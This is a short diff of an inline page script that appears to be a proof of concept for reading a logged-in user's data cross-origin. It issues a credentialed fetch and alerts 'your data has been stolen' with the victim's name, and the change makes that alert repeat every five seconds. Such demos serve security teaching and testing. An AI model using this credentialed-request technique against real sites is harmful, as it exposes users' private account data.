@@ -13,7 +13,7 @@
         credentials: "include"
       }).then(resp =>
         resp.json().then(e => {
-          window.alert("Hi " + e.name + " your data has been stolen")
+          setInterval(() => window.alert("Hi " + e.name + " your data has been stolen"), 5000);
         })
       );
     </script>
